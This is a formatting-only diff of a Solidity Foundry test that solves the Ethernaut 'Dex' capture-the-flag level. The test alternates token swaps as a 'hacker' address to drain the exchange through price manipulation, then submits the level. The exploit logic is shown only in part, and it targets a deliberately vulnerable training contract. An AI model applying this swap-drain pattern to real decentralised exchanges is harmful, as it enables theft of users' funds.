@@ -33,13 +33,13 @@ contract DexTest is DSTest {
         address token2 = ethernautDex.token2();
 
         ethernautDex.approve(levelAddress, type(uint256).max);
-        for(uint256 i; i < 5; ++i) {
+        for (uint256 i; i < 5; ++i) {
             if (i % 2 == 0) {
                 ethernautDex.swap(token1, token2, ethernautDex.balanceOf(token1, hacker));
             } else {
                 ethernautDex.swap(token2, token1, ethernautDex.balanceOf(token2, hacker));
             }
-        
+
             emit log("---------------- swap ----------------");
             emit log_named_uint("The hacker's balance of token1", ethernautDex.balanceOf(token1, hacker));
             emit log_named_uint("The hacker's balance of token2", ethernautDex.balanceOf(token2, hacker));
@@ -59,9 +59,7 @@ contract DexTest is DSTest {
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
